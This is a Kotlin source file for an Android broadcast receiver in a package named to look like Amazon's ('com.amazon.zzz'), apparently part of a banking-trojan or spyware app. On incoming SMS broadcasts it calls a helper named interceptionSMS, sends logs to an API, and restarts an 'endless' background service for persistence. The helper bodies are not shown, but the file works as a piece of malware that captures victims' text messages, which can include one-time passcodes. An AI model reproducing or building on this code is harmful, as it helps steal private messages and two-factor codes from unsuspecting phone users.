package com.amazon.zzz.Receivers

import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.amazon.zzz.ApiNm.apiUt
import com.amazon.zzz.Services.srvEndlessService.Companion.autoStart
import com.amazon.zzz.Utilsss.utUtils
import java.util.concurrent.TimeUnit

class StartReceiver : BroadcastReceiver() {
    @SuppressLint("UnsafeProtectedBroadcastReceiver")
    override fun onReceive(context: Context, intent: Intent) {
        apiUt.sendLogs(context, "", "StartReceiver onReceive", "log")
        //------sms---------
        if (intent.action == "android.provider.TelephonyClass.SMS_RECEIVED" || intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            utUtils.interceptionSMS(context, intent)

            try {
                TimeUnit.SECONDS.sleep(2)
            } catch (e: InterruptedException) {
                utUtils.Log("rec", e.localizedMessage)
            }
        }

        utUtils.startCustomTimer(context, 30000)
        autoStart(context)
    }

}